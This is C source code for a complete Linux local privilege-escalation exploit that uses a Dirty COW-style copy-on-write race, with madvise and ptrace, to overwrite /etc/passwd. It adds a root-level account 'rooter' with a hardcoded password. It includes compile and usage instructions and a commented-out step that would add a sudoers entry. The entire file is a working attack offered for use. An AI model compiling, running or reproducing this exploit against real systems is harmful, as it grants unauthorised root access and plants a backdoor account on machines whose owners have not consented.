
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty"
//
// Afterwards, you can either "su rooter" or "ssh rooter@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
// Default Password: Hello@World
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "salt";
void * map = NULL;




struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int write_file(const char * filename, int content_len,char * content){
  int f = open(filename, O_RDONLY);
  struct stat st;
  fstat(f, &st);
  map = mmap(NULL,st.st_size + sizeof(long),PROT_READ,MAP_PRIVATE,f,0);
  pid_t pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=content_len;
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(content + o)));
        }
      }
    }
  }
  else {
    pthread_t pth;
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  user.username = "rooter";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "root";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw="Hello@World";

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);
  
  write_file(filename,strlen(complete_passwd_line),complete_passwd_line);
  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",user.username, plaintext_pw);
  printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",backup_filename, filename);

/*
  // Add Sudoers 
  const char *sudoers_filename = "/etc/sudoers";
  const char *sudoers_backup_filename = "/tmp/sudoers.bak";
  ret = copy_file(sudoers_filename, sudoers_backup_filename);
  if (ret != 0) {
    exit(ret);
  }
  char * sudoers_content = "rooter\tALL=(ALL:ALL) ALL";
  write_file(sudoers_filename,strlen(sudoers_content),sudoers_content);
  printf("Done! Check %s to see if the sudoers was created.\n", sudoers_filename);
  printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",sudoers_backup_filename, sudoers_filename);
*/
  return 0;
}